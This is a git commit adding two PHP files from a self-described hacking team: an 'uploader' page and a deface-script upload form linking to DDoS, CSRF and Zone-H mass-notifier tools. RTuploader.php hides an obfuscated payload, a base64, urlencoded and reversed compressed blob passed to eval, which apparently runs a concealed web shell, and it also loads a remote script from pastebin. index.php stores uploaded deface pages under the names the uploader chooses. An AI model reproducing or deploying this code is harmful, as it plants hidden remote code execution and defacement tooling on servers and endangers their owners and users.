3421c19660c078b1e7b943949480425608aee690
rasitech-sudo <73753579+rasitech-sudo@users.noreply.github.com>
2021-07-25 18:53:07 +0700

    Add files via upload

---
+++ RTuploader.php
@@ -0,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <meta name="author" content="Cyber FRI3NDS Team"> 
+    <meta name="description" content="Let's Learn Networking Together">
+    <meta name="theme-color" content="#000">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
+    <link rel="icon" href="https://www.upload.ee/image/11125085/IMG-20200214-WA0000.jpg" type="image/jpg">
+    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
+    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> <script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
+		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
+    <title>Uploader Rasi Tech</title>
+    <style>
+    	body{background-color:#000;font-family:"Righteous";color:#fff;}
+    	#ico{width:200px;height:150px;}
+    </style>
+  </head>
+  <body>
+
+    <div class="container text-center mx-auto">
+    	<h2 class="mt-3">Uploader Cyber FRI3NDS Team</h2> 
+    	<img src="" class="mx-auto d-block" id="ico">    	
+    	<div id="Clock" align="center" style="font-size:38px;font-family:'iceland';color:white;"></div><br>
+    			
+<?php
+
+$Cyber = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjRDcmltZSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
+$Crime = "==QLbnPiB8nOulZc4Phcdci2QWXu3rn4Yx6owRQDpxlXrarGqTLGdJC08kAqRWRurRzj3GA5zSo4pvyCs6VxTfU29R7VU3ZthQXwGeZbJyQr0JmuIN0k5J06DW2tLsCL6UWRkSXJMmbiWcFofVTMyDZxU3/N2lRnMsosZ2+COVlJalUTi6sx2KgtTBfKdCwz/JwGF0ZDJjyT8wWTrDJkHrJcIGtplJ7UBLB4PAIfvjjTUhg0uUYNsIawdkel/rJUZXevH0EBy4MMIVuXS9OixI5r5TR/B2PAT3u+UKqE4CtS9Pk9xLaf7N1/tjydZmHFLzKQ/BkgZ+eGyiAbS1DPBgUy4UUU+SzpickKxGp3qHe9Jo3yTM3EMeDtvsPz1Z/z/lQ5sUKQh5MzgFodJR2rf7I96vClPzm9PFIZbJmV6RH4xnEz51JCnQTik2xh8+ztaa9HYgeRSzEoVqp/d4XBppcVJUSVtMIJXyyX0BT3B4W6WnzGONOFGV2Sn2lwrFV3JIZJAFuEy2ED1d5xYnnnkkjnzbETb+t8dwefyznWaKbFFdgkod9FrpkzoqtXtN/F6ciI71oiSNH6AY8ORTPpWZ0Sm3OubfuOkRcIvs3mBQqNDtWd5kINJvm5jGWuhxoIYUk4B7O7eW7a84k7ZyDcRP/m2hapyEObhJD0w5/4GkYP6zT4bPo+0nZfaYDk3TnoFPmOggoBjG9/BsQHj++7N5Ej1qTyVXCwUzDGm2Mvu7JN79fbgnFfrJXFaAwSzGMOw1d+TaAi//tXZ4bK7O6P3d0H5gKhBVaRyJqpKjBTJylF+J3sJBpTFjVEvy8hQcxpvpnZXRoVMKVS4VCX7MdOFXFKTdsqRmELmRugjSx4FArtNqSIYpAE18JnungoT9BUfoGRTUTx5RMNR0rEtERjqElYaU2ZUVOHKHFYc/9XcceuHLOUGqJtW9YCv+5fqjKo2tsE1hlhkQeIIsXoQ1AtOspRo3UfyjFkzJ0NH4fpM1PFwo9brRVnciX/IIw9B0/ACwfA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
+exit;
+?>
+</html>
---
+++ index.php
@@ -0,0 +1,138 @@
+<?php
+// Do we process an upload...
+if (isset($_REQUEST['upload']) && isset($_FILES['file']))
+{
+    // Get the extension (cheap solution. no preg_*)
+    $extension = explode('.', $_FILES['file']['name']);
+    $extension = $extension[count($extension)-1];
+
+    if (in_array(strtolower($extension), array('html','phtml','htm')))
+    {
+        // Do we have the file and can we read it?
+        if (is_file($_FILES['file']['tmp_name']) && is_readable($_FILES['file']['tmp_name'])) 
+        {
+            // Go ahead and copy it to the upload dir...
+            if (move_uploaded_file($_FILES['file']['tmp_name'], "./" . $_FILES['file']['name'])) {
+                die ('Berhasil Upload, Cara aksesnya http://rasitech.000webhostapp.com/sc/namafile.html');
+            } else {
+                die ('Error Saat Upload');
+            }
+        } else {
+            die ("Gabisa Upload nih :(");
+        }
+    } else {
+        die ("Extensinya Salah!!");
+    }
+} else {
+// We better display the form
+    echo <<<FORM
+   <br /><br />
+<center>
+<h1 style="color: black; font-family: Hacked;">Uploader Rasi Tech</h1>
+</center>
+<center>
+
+<form method="post" action="/sc/up.php?upload" enctype="multipart/form-data">
+    <input class="custom-file-input" type="file" name="file" />
+    <input class="button1" type="submit" name="submit" />
+   
+</form>
+<center><p>Cara Aksessnya? Buka http://rasitech.000webhostapp.com/sc/</p></center>
+ <style>
+ body{
+background-color: black;background-image: url("https://images7.alphacoders.com/753/753759.png") ;background-repeat:no-repeat ;background-size: 100% 100%;background-opacity: 0.7;
+}
+.h1,h2,h3,h4,h5,h6 {
+   color: #20B2AA;
+   size: 89px;
+  
+}
+@font-face {
+    font-family: Hacked;
+    src: url(https://watchdogsfont.com/font/HACKED_Title.ttf);
+}  
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+.custom-file-input {
+  color: transparent;
+}
+.custom-file-input::-webkit-file-upload-button {
+  visibility: hidden;
+}
+.custom-file-input::before {
+  content: 'Pilih SC Deface';
+  color: black;
+  display: inline-block;
+  background: -webkit-linear-gradient(top, #f9f9f9, #e3e3e3);
+  border: 1px solid #999;
+  border-radius: 3px;
+  padding: 5px 8px;
+  outline: none;
+  white-space: nowrap;
+  -webkit-user-select: none;
+  cursor: pointer;
+  text-shadow: 1px 1px #fff;
+  font-weight: 700;
+  font-size: 10pt;
+}
+.custom-file-input:hover::before {
+  border-color: black;
+}
+.custom-file-input:active {
+  outline: 0;
+}
+.custom-file-input:active::before {
+  background: -webkit-linear-gradient(top, #e3e3e3, #f9f9f9); 
+}
+
+body {
+  padding: 20px;
+}
+.button1 {
+  color: black;
+  display: inline-block;
+  background: -webkit-linear-gradient(top, #f9f9f9, #e3e3e3);
+  border: 1px solid #999;
+  border-radius: 3px;
+  padding: 5px 8px;
+  outline: none;
+  white-space: nowrap;
+  -webkit-user-select: none;
+  cursor: pointer;
+  text-shadow: 1px 1px #fff;
+  font-weight: 700;
+  font-size: 10pt;
+}
+
+</style>
+<br></br>
+<iframe src="https://rasitech.000webhostapp.com/Link%20Tracker/lacak.php" style="height:320px;width:370px;border: none;"></iframe>
+<br></br><br></br>
+ <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/tools1';">Tools Online 1</button>
+    <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/tools2';">Tools Online 2</button>
+     <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/chatting';">Chatting Online</button>
+      <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/DDOS.php';">DDOS Online</button>
+       <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/Url.PHP';">URL Encoded</button>
+        <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/CSRF.php';">CSRF Online</button>
+        <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/Zone-H.php';">Zone-H Mass Notifier</button>
+        <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/CSS/up.php';">Upload CSS Keren</button>
+        <button class="button1" onclick="window.location.href = 'https://rasitech.000webhostapp.com/Jernihkan%20Gambar/';">Jernihkan Gambar</button>
+         <button class="button1" onclick="window.location.href = http://rasitech.000webhostapp.com/Screen%20Recorder%20Rasi';">Online Screen Recorder Win</button>
+<br></br><br></br>
+<button class="button1" onclick="window.location.href = 'https://drive.google.com/file/d/19o5H3RKPK5RDL6zZ0ylwL0Pcv2c4VjZk/view?usp=drivesdk';">Download Source Code</button>
+<br></br><br></br><br></br>
+<script src="https://apis.google.com/js/platform.js"></script>
+<center><div class="g-ytsubscribe" data-channelid="UChD8wkriYsrvpTv2_2lUgHg" data-layout="full" data-count="default"></div></center>
+FORM;
+}
+?>
